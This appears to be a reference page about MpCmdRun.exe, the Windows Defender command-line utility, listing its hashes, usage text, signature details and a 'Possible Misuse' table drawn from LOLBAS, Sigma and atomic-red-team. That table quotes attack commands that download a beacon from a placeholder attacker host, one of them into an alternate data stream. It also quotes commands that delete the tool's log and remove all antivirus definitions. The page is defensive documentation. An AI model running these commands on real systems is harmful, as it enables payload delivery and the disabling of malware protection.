---
title: MpCmdRun.exe | Microsoft Malware Protection Command Line Utility
excerpt: What is MpCmdRun.exe?
---

# MpCmdRun.exe 

* File Path: `C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\X86\MpCmdRun.exe`
* Description: Microsoft Malware Protection Command Line Utility

## Hashes

Type | Hash
-- | --
MD5 | `AC330E80331BE4EBE176AD976215F020`
SHA1 | `2D4DC0B0CFCB25FFAAFE0F0951F7AE9B2E007361`
SHA256 | `8AE272396DCA1EA6FE09E2982C3C4727A926371AB4B904C188B570D5D5D193E1`
SHA384 | `F2B509415CE1110E0E3B8CD037D7C22D2FFAED9E7348F51C769237D88F2261DE84D15BDFBBA1FB7FFE42100BCF7768AA`
SHA512 | `3E95A6F3A2FC81D7781CA61106F4220CFDBEF989406E1728984BB5687D9BE318847540D7CE37BD07F59B5B1CF3FE1D85AA95FBA208FA81E1DF248E37B87B0AEB`
SSDEEP | `6144:G1eh9BpFx+DqKE4wjna4290c3oWZhZ1ZDxoaHQpI9zBu4DaRO8XbcL4dUk:GlvE4wjanV1YaHQG9du4Da9XM4dn`
IMP | `2BBC7CF6F4B8F8DDD8763575A3FE5EBB`
PESHA1 | `BF1F8FEBC5994270C1BD28E0EE38F5DEC89A8B2A`
PE256 | `0871DB68692BE5093DD9D54CAF50303617F6BA09DD32634566F37240EA084141`

## Runtime Data

### Usage (stdout):
```cmhg
Microsoft Antimalware Service Command Line Utility (c) 2006-2020 Microsoft Corp
Use this tool to automate and troubleshoot Microsoft Antimalware Service

Usage:
MpCmdRun.exe [command] [-options]

Command Description
   -? / -h                                    Displays all available options
                                              for this tool
   -Scan [-ScanType #] [-File <path> [-DisableRemediation] [-BootSectorScan] [-CpuThrottling]]
         [-Timeout <days>]
         [-Cancel]
         [-ReturnHR]
                                              Scans for malicious software
   -Trace [-Grouping #] [-Level #]            Starts diagnostic tracing
   -GetFiles [-SupportLogLocation <path>]     Collects support information
   -GetFilesDiagTrack                         Same as Getfiles but outputs to 
                                              temporary DiagTrack folder 
   -RemoveDefinitions [-All]                  Restores the installed
                                              signature definitions
                                              to a previous backup copy or to
                                              the original default set of
                                              signatures
                      [-Engine]               Restore the installed engine to
                                              the previous version saved
                      [-DynamicSignatures]    Removes only the dynamically
                                              downloaded signatures
   -SignatureUpdate [-UNC | -MMPC]            Checks for new definition updates
   -Restore  [-ListAll | [[-Name <name>] [-All] | [-FilePath <filePath>]] [-Path <path>]]  Restore or list
                                                               quarantined item(s)
   -AddDynamicSignature [-Path]               Loads a dynamic signature
   -ListAllDynamicSignatures                  List the loaded dynamic signatures
   -RemoveDynamicSignature [-SignatureSetID]  Removes a dynamic signature
   -CheckExclusion -path <path>               Checks whether path is excluded
   -DownloadFile -URL <url> -path <path>      Downloads a file from the given URL
                                              to the location given in path. Path
                                              should also have the file name in it.

Additional Information:

Support information will be in the following directory:
C:\ProgramData\Microsoft\Windows Defender\Support

   -Scan [-ScanType value]
        0  Default, according to your configuration
        1  Quick scan
        2  Full system scan
        3  File and directory custom scan

           [-File <path>]
                Indicates the file or directory  to be scanned, only valid for custom scan.

           [-DisableRemediation]
                This option is valid only for custom scan.
                When specified:
                  - File exclusions are ignored.
                  - Archive files are scanned.
                  - Actions are not applied after detection.
                  - Event log entries are not written after detection.
                  - Detections from the custom scan are not displayed in the user interface.
                  - The console output will show the list of detections from the custom scan.

           [-BootSectorScan]
                Enables boot sector scanning; only valid for custom scan.

           [-Timeout <days>]
                Timeout in days; maximum value is 30.
                If this parameter is not specified, default value is 7 days for full scan and 1 day for all other scans.

           [-Cancel]
                Try to cancel any ongoing quick or full scan.

           [-CpuThrottling]
                When specified:
                  - Will ensure that the scan obeys the CPU throttling as defined in the policy (Default 50).

           [-ReturnHR]
                Instead of returning the default 0 or 2 values, return the actual HRESULT of the scan command.

      [DEFAULT]Return code is
      0    if no malware is found or malware is successfully remediated and no additional user action is required
      2    if malware is found and not remediated or additional user action is required to complete remediation or there is error in scanning.  Please check History for more information.
      OR
      HRESULT of the scan command if -ReturnHR was specified

   -Trace [-Grouping value] [-Level value]
        Begins tracing Microsoft Antimalware Service's actions.
        You can specify the components for which tracing is enabled and
        how much information is recorded.
        If no component is specified, all the components will be logged.
        If no level is specified, the Error, Warning and Informational levels
        will be logged. The data will be stored in the support directory
        as a file having the current timestamp in its name and bearing
        the extension BIN.

        [-Grouping]
        0x1    Service
        0x2    Malware Protection Engine
        0x4    User Interface
        0x8    Real-Time Protection
        0x10   Scheduled actions
        0x20   WMI
        0x40   NIS/GAPA
        0x80   Windows Security Center
        0x100  DLP external

        [-Level]
        0x1    Errors
        0x2    Warnings
        0x4    Informational messages
        0x8    Function calls
        0x10   Verbose
        0x20   Performance

   -CaptureNetworkTrace -path <path>
       Captures all the network input into the Network Protection service and 
       saves it to a file at <path>. Supply an empty path to stop tracing
       Note: The specified path must be writable by LocalService
       ex: C:\Users\Public\Downloads 

   -GetFiles
        Gathers the following log files and packages them together in a 
        compressed file in the support directory

        - Any trace files from Microsoft Antimalware Service
        - The Windows Update history log
        - All Microsoft Antimalware Service events from the System event log
        - All relevant Microsoft Antimalware Service registry locations
        - The log file of this tool
        - The log file of the signature update helper tool

        [-SupportLogLocation <path>]
        Copies the support logs to the specified <path>. If <path> is not specified,
        support logs will be copied to the location specified in the SupportLogLocation Configuration.

   -GetFilesDiagTrack
        Same as GetFiles, but outputs the CAB file to the temp DiagTrack 
        directory

   -RemoveDefinitions
        Restores the last set of signature definitions

        [-Engine]
        Restores the last saved engine
        Use this option to restore the previous engine.

        [-All]
        Removes any installed signature and engine files. Use this 
        option if you have difficulties trying to update signatures.

        [-DynamicSignatures]
        Removes all Dynamic Signatures. 

   -SignatureUpdate
        Checks for new definition updates

        [-UNC [-Path <path>]]
        Performs update directly from UNC file share specified in <path>
        If -Path is not specified, update will be performed directly from the
             preconfigured UNC location

        [-MMPC]
        Performs update directly from Microsoft Malware Protection Center

   -Restore
        [-ListAll]
        List all items that were quarantined

        [-Name <name>]
        Restores the most recently quarantined item based on threat name
        One Threat can map to more than one file

        [-All]
        Restores all the quarantined items based on name

        [-FilePath <filePath>]
        Restores quarantined item based on file path

        [-Path]
        Specify the path where the quarantined items will be restored.
        If not specified, the item will be restored to the original path.
   -AddDynamicSignature -Path <path> 
        Adds a Dynamic Signature specified by <path>

   -ListAllDynamicSignatures
        Lists SignatureSet ID's of all Dynamic Signatures added to the client
        via MAPS and MPCMDRUN -AddDynamicSignature

   -RemoveDynamicSignature -SignatureSetID <SignatureSetID> 
        Removes a Dynamic Signature specified by <SignatureSetID>

   -CheckExclusion -path <path>
        Checks whether <path> is excluded. It can be either a path, or a file.


```

### Loaded Modules:

Path |
-- |
C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\X86\MpCmdRun.exe |
C:\Windows\SYSTEM32\ntdll.dll |
C:\Windows\System32\wow64.dll |
C:\Windows\System32\wow64cpu.dll |
C:\Windows\System32\wow64win.dll |


## Signature

* Status: Signature verified.
* Serial: `330000024A0E8AFDF15C662D2B00000000024A`
* Thumbprint: `96384A7F5F1C438F32E2454697DC6D312A74517B`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows Publisher, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: MpCmdRun.exe
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 4.18.2008.9 (WinBuild.160101.0800)
* Product Version: 4.18.2008.9
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.
* Machine Type: 32-bit

## File Scan

* VirusTotal Detections: 0/69
* VirusTotal Link: https://www.virustotal.com/gui/file/8ae272396dca1ea6fe09e2982c3c4727a926371ab4b904c188b570d5d5d193e1/detection/


## Possible Misuse

*The following table contains possible examples of `MpCmdRun.exe` being misused. While `MpCmdRun.exe` is **not** inherently malicious, its legitimate functionality can by abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[sigma](https://github.com/Neo23x0/sigma) | [win_meterpreter_or_cobaltstrike_getsystem_service_start.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_meterpreter_or_cobaltstrike_getsystem_service_start.yml) | `CommandLine\|contains: 'MpCmdRun'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_mpcmdrun_download.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_mpcmdrun_download.yml) | `- https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_mpcmdrun_download.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_mpcmdrun_download.yml) | `- CommandLine\|contains: 'MpCmdRun.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [MpCmdRun.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/MpCmdRun.yml) | `Name: MpCmdRun.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [MpCmdRun.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/MpCmdRun.yml) | `- Command: MpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\\temp\\beacon.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [MpCmdRun.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/MpCmdRun.yml) | `- Command: MpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\\temp\\nicefile.txt:evil.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [MpCmdRun.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/MpCmdRun.yml) | `- Path: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.4-0\MpCmdRun.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [MpCmdRun.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/MpCmdRun.yml) | `- Path: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.7-0\MpCmdRun.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [MpCmdRun.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/MpCmdRun.yml) | `- Path: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [MpCmdRun.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/MpCmdRun.yml) | `- IOC: MpCmdRun storing data into alternate data streams.` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [MpCmdRun.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/MpCmdRun.yml) | `- IOC: MpCmdRun getting a file from a remote machine or the internet that is not expected.` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [MpCmdRun.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/MpCmdRun.yml) | `- IOC: Monitor process creation for non-SYSTEM and non-LOCAL SERVICE accounts launching mpcmdrun.exe.` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [MpCmdRun.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/MpCmdRun.yml) | `- IOC: Monitor for the creation of %USERPROFILE%\AppData\Local\Temp\MpCmdRun.log` | 
[malware-ioc](https://github.com/eset/malware-ioc) | [nukesped_lazarus](https://github.com/eset/malware-ioc/blob/master/nukesped_lazarus/README.adoc) | `.`MpCmdRun.exe`` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md) | - Atomic Test #13: Download a File with Windows Defender MpCmdRun.exe [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [windows-index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md) | - Atomic Test #13: Download a File with Windows Defender MpCmdRun.exe [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1105.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md) | - [Atomic Test #13 - Download a File with Windows Defender MpCmdRun.exe](#atomic-test-13---download-a-file-with-windows-defender-mpcmdrunexe) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1105.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md) | ## Atomic Test #13 - Download a File with Windows Defender MpCmdRun.exe | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1105.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md) | More info and how to find your version can be found here https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/ | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1105.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md) | MpCmdRun.exe -DownloadFile -url #{remote_file} -path #{local_path} | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1105.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md) | del %temp%\MpCmdRun.log >nul 2>&1 | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1562.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md) | Removing definition files would cause ATP to not fire for AntiMalware. Check MpCmdRun.exe man page for info on all arguments. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1562.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md) | "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_golddragon.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_golddragon.yar) | $s7 = "MpCmdRun.dll" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)



MIT License. Copyright (c) 2020 Strontic.


